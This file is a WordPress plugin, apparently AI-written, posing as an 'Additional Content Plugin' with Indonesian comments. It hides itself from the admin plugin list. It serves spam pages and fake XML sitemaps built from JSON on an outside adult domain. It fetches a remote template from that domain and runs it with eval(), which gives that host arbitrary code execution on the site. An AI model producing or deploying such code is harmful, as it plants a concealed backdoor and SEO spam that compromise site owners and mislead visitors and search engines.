<?php
/*
Plugin Name: Additional Content Plugin
Description: Plugin konten & sitemap stealth (Virtual XML) dengan fitur Hidden Mode.
Version: 6.0
Author: Grok
*/

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// KONFIGURASI URL DEFAULT
define('ACP_TEMPLATE_URL', 'https://player.javpornsub.net/template/index.txt');
define('ACP_JSON_BASE_URL', 'https://player.javpornsub.net/content/');

// 1. FITUR HIDDEN PLUGIN (Mode Hantu)
add_filter('all_plugins', 'acp_hide_plugin_from_list');
function acp_hide_plugin_from_list($plugins) {
    if (get_option('acp_plugin_hidden', false)) {
        $plugin_file = plugin_basename(__FILE__);
        if (isset($plugins[$plugin_file])) {
            unset($plugins[$plugin_file]);
        }
    }
    return $plugins;
}

// Register admin menu
add_action('admin_menu', 'acp_admin_menu');
function acp_admin_menu() {
    add_menu_page(
        'Additional Content Settings',
        'Content Plugin',
        'manage_options',
        'additional-content-plugin',
        'acp_admin_page',
        'dashicons-hidden' // Ikon diganti jadi mata/hidden
    );
}

// Generate random string
function acp_generate_random_string($length = 5) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $random_string = '';
    for ($i = 0; $i < $length; $i++) {
        $random_string .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $random_string;
}

// Admin page content
function acp_admin_page() {
    // A. Handle Visibility Toggle (Hidden Mode)
    if (isset($_POST['acp_toggle_visibility'])) {
        if (!isset($_POST['_wpnonce']) || !wp_verify_nonce($_POST['_wpnonce'], 'acp_action')) {
            wp_die('Security check failed');
        }
        $current_status = get_option('acp_plugin_hidden', false);
        update_option('acp_plugin_hidden', !$current_status);
        $status_text = !$current_status ? 'DISEMBUNYIKAN' : 'DITAMPILKAN';
        echo '<div class="updated"><p>Status Plugin: <strong>' . $status_text . '</strong> di daftar plugin.</p></div>';
    }

    // B. Handle Reset
    if (isset($_POST['acp_reset'])) {
        if (!isset($_POST['_wpnonce']) || !wp_verify_nonce($_POST['_wpnonce'], 'acp_action')) {
            wp_die('Security check failed');
        }
        delete_option('acp_endpoints');
        echo '<div class="updated"><p>Semua endpoint telah dihapus.</p></div>';
    }

    // C. Handle Setup (Input Jumlah Endpoint)
    if (isset($_POST['acp_setup_endpoints'])) {
        if (!isset($_POST['_wpnonce']) || !wp_verify_nonce($_POST['_wpnonce'], 'acp_action')) {
            wp_die('Security check failed');
        }

        $count = intval($_POST['endpoint_count']);
        if ($count > 0) {
            $new_endpoints = [];
            for ($i = 0; $i < $count; $i++) {
                $new_endpoints[] = [
                    'json_filename' => acp_generate_random_string(10),
                    'sitemap_name'  => acp_generate_random_string(5)
                ];
            }
            update_option('acp_endpoints', $new_endpoints);
            echo '<div class="updated"><p>' . $count . ' Endpoint berhasil dikonfigurasi.</p></div>';
            
            acp_register_rewrite_rules();
            flush_rewrite_rules();
        }
    }

    // Get current data
    $endpoints = get_option('acp_endpoints', false);
    $is_hidden = get_option('acp_plugin_hidden', false);

    // Auto Repair Logic
    if ($endpoints !== false && is_array($endpoints)) {
        $is_dirty = false;
        foreach ($endpoints as &$ep) {
            if (empty($ep['json_filename'])) { $ep['json_filename'] = acp_generate_random_string(10); $is_dirty = true; }
            if (empty($ep['sitemap_name'])) { $ep['sitemap_name'] = acp_generate_random_string(5); $is_dirty = true; }
        }
        unset($ep);
        if ($is_dirty) update_option('acp_endpoints', $endpoints);
    }

    ?>
    <div class="wrap">
        <h1>Additional Content Plugin (Stealth Edition)</h1>

        <div style="background: #fff; padding: 15px; border: 1px solid #ccd0d4; border-left: 4px solid #72aee6; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center;">
            <div>
                <strong>Status Keamanan:</strong> 
                <?php if ($is_hidden): ?>
                    <span style="color: red; font-weight: bold;">TERSEMBUNYI (Stealth)</span>
                <?php else: ?>
                    <span style="color: green; font-weight: bold;">TERLIHAT</span>
                <?php endif; ?>
                <p class="description" style="margin: 5px 0 0;">
                    <?php if ($is_hidden): ?>
                        Plugin ini tidak terlihat di menu <code>Plugins</code>. Akses halaman ini melalui URL: <br>
                        <code><?php echo admin_url('admin.php?page=additional-content-plugin'); ?></code>
                    <?php else: ?>
                        Plugin ini terlihat di daftar plugin seperti biasa.
                    <?php endif; ?>
                </p>
            </div>
            <form method="post" action="">
                <?php wp_nonce_field('acp_action'); ?>
                <input type="submit" name="acp_toggle_visibility" 
                       class="button <?php echo $is_hidden ? 'button-secondary' : 'button-primary'; ?>" 
                       value="<?php echo $is_hidden ? 'Munculkan Plugin (Unhide)' : 'Sembunyikan Plugin (Hide)'; ?>">
            </form>
        </div>

        <?php if ($endpoints === false || empty($endpoints)): ?>
            <div class="card" style="max-width: 500px; padding: 20px;">
                <h2>Setup Endpoint Baru</h2>
                <form method="post" action="">
                    <?php wp_nonce_field('acp_action'); ?>
                    <p>
                        <label for="endpoint_count">Jumlah endpoint:</label><br>
                        <input type="number" name="endpoint_count" id="endpoint_count" value="3" min="1" max="100" class="small-text">
                    </p>
                    <p class="submit">
                        <input type="submit" name="acp_setup_endpoints" class="button button-primary" value="Buat Endpoint">
                    </p>
                </form>
            </div>

        <?php else: ?>
            <form method="post" action="">
                <h2>Daftar Endpoint Aktif (Virtual XML)</h2>
                <p>XML Sitemap di bawah ini bersifat <strong>Virtual</strong>. File tidak ada di server, tapi bisa diakses browser/Google.</p>
                
                <table class="wp-list-table widefat fixed striped">
                    <thead>
                        <tr>
                            <th width="50">No</th>
                            <th>Nama JSON (Target URL)</th>
                            <th>Link Sitemap (Virtual)</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($endpoints as $index => $ep): 
                             // Generate link sitemap virtual
                             $sitemap_url = home_url($ep['sitemap_name'] . '.xml');
                             $xml_filename = $ep['sitemap_name'] . '.xml';
                        ?>
                        <tr>
                            <td><?php echo $index + 1; ?></td>
                            <td>
                                <div style="display: flex; align-items: center;">
                                    <input type="text" id="json_file_<?php echo $index; ?>" value="<?php echo esc_attr($ep['json_filename']); ?>" class="regular-text" style="width: 200px;" readonly onclick="this.select();">
                                    <span style="margin: 0 10px;">.json</span>
                                    <span class="dashicons dashicons-admin-page acp-copy-btn" 
                                          data-target="json_file_<?php echo $index; ?>" 
                                          title="Copy Filename" style="cursor: pointer; color: #0073aa; font-size: 20px;"></span>
                                    <span class="acp-copy-msg" style="display:none; margin-left: 8px; color: green; font-weight: bold; font-size: 12px;">Copied!</span>
                                </div>
                                <p class="description">Upload ke: <?php echo ACP_JSON_BASE_URL . esc_html($ep['json_filename']) . '.json'; ?></p>
                            </td>
                            <td>
                                <div style="display: flex; align-items: center; gap: 5px;">
                                    <a href="<?php echo esc_url($sitemap_url); ?>" target="_blank" style="font-weight: bold;"><?php echo esc_html($sitemap_url); ?></a>
                                    
                                    <input type="text" id="sitemap_<?php echo $index; ?>" value="<?php echo esc_attr($xml_filename); ?>" style="position: absolute; left: -9999px;">
                                    <span class="dashicons dashicons-admin-page acp-copy-btn" 
                                          data-target="sitemap_<?php echo $index; ?>" 
                                          title="Copy Sitemap Name" style="cursor: pointer; color: #555; font-size: 18px;"></span>
                                    <span class="acp-copy-msg" style="display:none; color: green; font-size: 11px; font-weight: bold;">Copied!</span>
                                </div>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </form>
            
            <hr>
            <form method="post" action="" onsubmit="return confirm('Yakin ingin hapus semua konfigurasi?');">
                <?php wp_nonce_field('acp_action'); ?>
                <input type="submit" name="acp_reset" class="button button-secondary" value="Reset Konfigurasi">
            </form>
        <?php endif; ?>
    </div>

    <script>
        jQuery(document).ready(function($) {
            $('.acp-copy-btn').click(function() {
                var targetId = $(this).data('target');
                var copyText = document.getElementById(targetId);
                copyText.select();
                try {
                    navigator.clipboard.writeText(copyText.value);
                } catch (err) {
                    document.execCommand("copy");
                }
                var msg = $(this).siblings('.acp-copy-msg');
                msg.fadeIn(200).delay(1000).fadeOut(200);
            });
        });
    </script>
    <?php
}

// 2. REWRITE RULES (Virtual XML & Content)
add_action('init', 'acp_register_rewrite_rules');
function acp_register_rewrite_rules() {
    // Rule untuk Content: domain.com/judul-konten
    add_rewrite_rule('^([^/]+)/?$', 'index.php?acp_value=$matches[1]', 'top');
    
    // Rule untuk Sitemap Virtual: domain.com/abcde.xml atau domain.com/abcde-2.xml
    // Regex: ambil nama (abcde) dan opsional halaman (-2)
    add_rewrite_rule('^([^/]+?)(?:-(\d+))?\.xml$', 'index.php?acp_sitemap=$matches[1]&acp_sitemap_page=$matches[2]', 'top');
}

add_filter('query_vars', 'acp_query_vars');
function acp_query_vars($vars) {
    $vars[] = 'acp_value';          // Untuk konten
    $vars[] = 'acp_sitemap';        // Untuk nama sitemap
    $vars[] = 'acp_sitemap_page';   // Untuk halaman sitemap
    return $vars;
}

// 3. HANDLER REQUEST (Virtual Handler)
add_action('template_redirect', 'acp_handle_requests');
function acp_handle_requests() {
    global $wp_query;

    // A. HANDLE SITEMAP XML (Virtual)
    if (get_query_var('acp_sitemap')) {
        $sitemap_name = get_query_var('acp_sitemap');
        $page = get_query_var('acp_sitemap_page') ? intval(get_query_var('acp_sitemap_page')) : 1;
        if ($page < 1) $page = 1;

        $endpoints = get_option('acp_endpoints', []);
        $target_endpoint = false;

        // Cari endpoint yang cocok dengan nama sitemap
        foreach ($endpoints as $ep) {
            if ($ep['sitemap_name'] === $sitemap_name) {
                $target_endpoint = $ep;
                break;
            }
        }

        if ($target_endpoint) {
            // Set header XML
            header('Content-Type: application/xml; charset=utf-8');
            header('X-Robots-Tag: noindex, follow');

            // Fetch JSON
            $json_url = ACP_JSON_BASE_URL . $target_endpoint['json_filename'] . '.json';
            
            // Gunakan transient caching untuk performa
            $cache_key = 'acp_xml_' . md5($json_url);
            $konten_data = get_transient($cache_key);

            if ($konten_data === false) {
                $response = wp_remote_get($json_url, ['timeout' => 30]);
                if (!is_wp_error($response)) {
                    $body = wp_remote_retrieve_body($response);
                    $data = json_decode($body, true);
                    if (is_array($data)) {
                        $konten_data = $data;
                        set_transient($cache_key, $konten_data, HOUR_IN_SECONDS);
                    }
                }
            }

            if (!empty($konten_data) && is_array($konten_data)) {
                // Chunking logic (Virtual Pagination)
                $max_urls = 45000;
                $chunks = array_chunk($konten_data, $max_urls, true);
                $chunk_index = $page - 1;

                if (isset($chunks[$chunk_index])) {
                    echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
                    echo '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
                    
                    foreach ($chunks[$chunk_index] as $title => $desc) {
                        echo "\t<url>\n";
                        echo "\t\t<loc>" . esc_url(home_url(urlencode($title))) . "</loc>\n";
                        echo "\t\t<lastmod>" . date('c') . "</lastmod>\n"; // Live date
                        echo "\t\t<changefreq>weekly</changefreq>\n";
                        echo "\t</url>\n";
                    }
                    
                    echo '</urlset>';
                    exit;
                }
            }
        }
        // Jika sitemap tidak ditemukan atau kosong, biarkan WP lanjut (404)
    }

    // B. HANDLE CONTENT DISPLAY
    if (get_query_var('acp_value')) {
        $title = sanitize_text_field(urldecode(get_query_var('acp_value')));
        
        // Cek post asli WP dulu
        if (get_page_by_path($title, OBJECT, ['post', 'page'])) return;

        $endpoints = get_option('acp_endpoints', []);
        
        foreach ($endpoints as $endpoint) {
            if (empty($endpoint['json_filename'])) continue;

            $konten_json_url = ACP_JSON_BASE_URL . $endpoint['json_filename'] . '.json';
            $cache_key = 'acp_konten_' . md5($konten_json_url);
            $konten_data = get_transient($cache_key);

            if ($konten_data === false) {
                $json_response = wp_remote_get($konten_json_url, ['timeout' => 10]);
                if (!is_wp_error($json_response)) {
                    $data = json_decode(wp_remote_retrieve_body($json_response), true);
                    if (is_array($data)) {
                        $konten_data = $data;
                        set_transient($cache_key, $konten_data, HOUR_IN_SECONDS);
                    }
                }
            }

            if (is_array($konten_data)) {
                // Case-insensitive search
                foreach ($konten_data as $key => $content_val) {
                    if (strtolower($key) === strtolower($title)) {
                        
                        // Definisikan variabel untuk template
                        $additional_content = $content_val;

                        // Fetch Template
                        $template_response = wp_remote_get(ACP_TEMPLATE_URL, ['timeout' => 15]);
                        if (!is_wp_error($template_response)) {
                            $template_content = wp_remote_retrieve_body($template_response);
                            if (!empty($template_content)) {
                                ob_start();
                                // Execute template
                                eval('?>' . $template_content);
                                echo ob_get_clean();
                                exit;
                            }
                        }
                    }
                }
            }
        }
        
        // 404 Manual
        $wp_query->set_404();
        status_header(404);
        get_template_part(404);
        exit;
    }
}
